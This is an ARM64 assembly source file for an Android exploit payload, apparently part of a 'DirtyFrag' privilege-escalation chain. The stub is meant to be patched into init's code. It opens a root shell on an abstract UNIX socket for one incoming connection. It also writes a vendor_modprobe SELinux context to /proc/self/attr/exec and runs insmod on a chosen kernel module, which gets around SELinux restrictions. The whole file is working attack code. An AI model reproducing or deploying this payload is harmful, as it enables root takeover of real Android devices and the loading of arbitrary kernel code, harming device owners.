// Minimal init stub for the DirtyFrag hybrid route (design prototype).
//
// Hooked into a libc++ sentry constructor (or libbase's LogMessage destructor).
// Checks uid==0 && tid==1, binds an abstract AF_UNIX socket whose 8-byte name is
// patched in at run time, forks, and the child accepts one connection, dup2s it
// onto 0/1/2 and execs /system/bin/sh. The parent executes the site's original
// instruction and branches back.
//
// Blob layout (patched at runtime):
//   [data: sockaddr + tables + paths][code][original insn][b hook+4]
//
// Registers: only caller-saved x0-x10 are touched; x0-x8 are saved/restored.

    .arch armv8-a
    .text

    .equ SYS_getpid, 172
    .equ SYS_getuid, 174
    .equ SYS_socket, 198
    .equ SYS_bind,   200
    .equ SYS_listen, 201
    .equ SYS_accept, 202
    .equ SYS_dup3,   24
    .equ SYS_close,  57
    .equ SYS_clone,  220
    .equ SYS_execve, 221
    .equ SYS_exit,   93
    .equ SYS_openat, 56
    .equ SYS_write,  64
    .equ SYS_wait4,  260

    .global stub_data
    .global stub_code
    .global stub_first_inst
    .global stub_end
    .global stub_sockaddr
    .global stub_name
    .global stub_ko_target

stub_data:
stub_sockaddr:
    .hword 1            // AF_UNIX
    .byte 0             // abstract namespace
stub_name:
    .space 8            // patched with a per-run random name
    .balign 4
sh_path:
    .asciz "/system/bin/sh"
env_path:
    .asciz "PATH=/sbin:/system/sbin:/system/bin:/system/xbin"
    .balign 8
/* Module pipeline: the app patches a vendor_file target here; an empty first
 * byte keeps the W1 pipelines on the plain shell path. The worker child insmods
 * it as vendor_modprobe (init -> vendor_modprobe is an allowed transition and
 * vendor_modprobe holds module_load on vendor_file). */
stub_ko_target:
    .space 64
attr_exec:
    .asciz "/proc/self/attr/exec"
selinux_ctx:
    .asciz "u:r:vendor_modprobe:s0"
selinux_ctx_end:
    .balign 4
exe_insmod:
    .asciz "/vendor/bin/insmod"
    .balign 4

stub_code:
    stp x0, x1, [sp, #-16]!
    stp x2, x3, [sp, #-16]!
    stp x4, x5, [sp, #-16]!
    stp x6, x7, [sp, #-16]!
    str x8, [sp, #-16]!

    mov x8, #SYS_getpid
    svc #0
    cmp x0, #1
    b.ne restore
    mov x8, #SYS_getuid
    svc #0
    cbnz x0, restore

    mov x0, #1          // AF_UNIX
    mov x1, #1          // SOCK_STREAM
    mov x2, #0
    mov x8, #SYS_socket
    svc #0
    cmp x0, #0
    b.lt restore
    mov x9, x0          // listening fd

    mov x0, x9
    adr x1, stub_sockaddr
    mov x2, #11         // sizeof(sa_family) + 1 + 8
    mov x8, #SYS_bind
    svc #0
    cbnz x0, parent_close

    mov x0, x9
    mov x1, #1
    mov x8, #SYS_listen
    svc #0
    cbnz x0, parent_close

    mov x0, #17         // SIGCHLD
    mov x1, #0
    mov x2, #0
    mov x3, #0
    mov x4, #0
    mov x8, #SYS_clone
    svc #0
    cbnz x0, parent_close

    // worker child: module prologue, then serve one connection.
    adr x1, stub_ko_target
    ldrb w2, [x1]
    cbz w2, accept_loop

    // fork the insmod grandchild; the worker waits (bounded by insmod) so the
    // caller's connect retry finds a permissive device.
    mov x0, #17         // SIGCHLD
    mov x1, #0
    mov x2, #0
    mov x3, #0
    mov x4, #0
    mov x8, #SYS_clone
    svc #0
    cbz x0, insmod_grandchild
    mov x10, x0
    mov x0, x10
    mov x1, #0
    mov x2, #0
    mov x3, #0
    mov x8, #SYS_wait4
    svc #0
    b accept_loop

insmod_grandchild:
    mov x0, #-100       // AT_FDCWD
    adr x1, attr_exec
    mov x2, #1          // O_WRONLY
    mov x3, #0
    mov x8, #SYS_openat
    svc #0
    cmp x0, #0
    b.lt insmod_fail
    mov x2, #(selinux_ctx_end - selinux_ctx)
    adr x1, selinux_ctx
    mov x8, #SYS_write
    svc #0
    // execve("/vendor/bin/insmod", ["/vendor/bin/insmod", target, NULL], NULL)
    sub sp, sp, #32
    adr x0, exe_insmod
    str x0, [sp]
    adr x0, stub_ko_target
    str x0, [sp, #8]
    str xzr, [sp, #16]
    adr x0, exe_insmod
    mov x1, sp
    mov x2, xzr
    mov x8, #SYS_execve
    svc #0
insmod_fail:
    mov x0, #0
    mov x8, #SYS_exit
    svc #0

    // child: serve exactly one connection, then hand it to a shell
accept_loop:
    mov x0, x9
    mov x1, #0
    mov x2, #0
    mov x8, #SYS_accept
    svc #0
    cmp x0, #0
    b.lt accept_loop
    mov x10, x0

    mov x0, x10
    mov x1, #0
    mov x2, #0
    mov x8, #SYS_dup3
    svc #0
    mov x0, x10
    mov x1, #1
    mov x2, #0
    mov x8, #SYS_dup3
    svc #0
    mov x0, x10
    mov x1, #2
    mov x2, #0
    mov x8, #SYS_dup3
    svc #0

    adr x0, sh_path
    adr x3, env_path
    sub sp, sp, #32
    str x0, [sp]
    str xzr, [sp, #8]
    str x3, [sp, #16]
    str xzr, [sp, #24]
    mov x1, sp
    add x2, sp, #16
    mov x8, #SYS_execve
    svc #0
    mov x0, #1
    mov x8, #SYS_exit
    svc #0

parent_close:
    mov x0, x9
    mov x8, #SYS_close
    svc #0
restore:
    ldr x8, [sp], #16
    ldp x6, x7, [sp], #16
    ldp x4, x5, [sp], #16
    ldp x2, x3, [sp], #16
    ldp x0, x1, [sp], #16
stub_first_inst:
    .word 0xd503201f    // placeholder: patched with the site's original insn
stub_br:
    .word 0x14000000    // placeholder: patched with b hook+4
stub_end:
